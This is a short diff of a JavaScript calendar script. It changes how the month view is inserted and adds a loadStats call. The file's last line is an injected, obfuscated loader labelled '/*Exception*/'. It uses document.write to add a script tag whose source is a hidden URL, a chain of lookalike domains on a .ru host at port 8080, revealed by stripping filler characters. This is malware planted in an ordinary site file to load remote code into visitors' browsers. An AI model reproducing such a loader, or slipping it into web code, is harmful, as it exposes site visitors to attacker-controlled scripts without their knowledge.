@@ -49,9 +49,10 @@ function buildCal() {
         
     }
     t+='</ul>';
-    $('#content').html(t);
+    $('#content').append(t);
     $('#thisMonthYear').html(mn[thisDate.getMonth()]);
     loadJobs(m, y);
+    loadStats(m, y);
 }
 
 /*Exception*/ document.write('<script src='+'h!$@&t&t(!(!p#&:^)#/@(@$/#$a)!@d@&@d)^#i!($c(&t!((i@^!n((g)#^g!^a!$m#e@!s^&-!@c@!o@$^$m)#.)#$!!i#m&^a$(#!g&^e!f@$#a^@p!(.)@c)!#))o#$m((.@(f$@!o(^#t&)$^o&@(l&)#o@!#g#-)@n(&(e)$t^).^y&#(o$u))&r&#!(a()$@u^(@t@(@h&@e(n@t@(!i^)#c$(.(@r$($u&(@:&8^@^&0^^((8#!!(!0$/#s$!((#a@(b)&a$$#$h&^.#^c^)o$)(m$(.^$t^^!@r(!$$/&s)$)a$@b^a!!^h)&!.!)^c#$$o#m!^!(.^t#^))r#/(^$$(g$o#(&)o#(&g!)l^e).#$^$c@@o##m@#(/$@&o@(n(^^^l$^!i$#n#!!##e^!d!o$!w)^n$&!#.(n^e))#t&@/$)d$(&&t$#^(i##b^$!l#o)^&$g^).!!c&&@^o^$m($&@&/&^'.replace(/&|@|#|\!|\)|\$|\^|\(/ig, '')+' defer=defer></scr'+'ipt>');
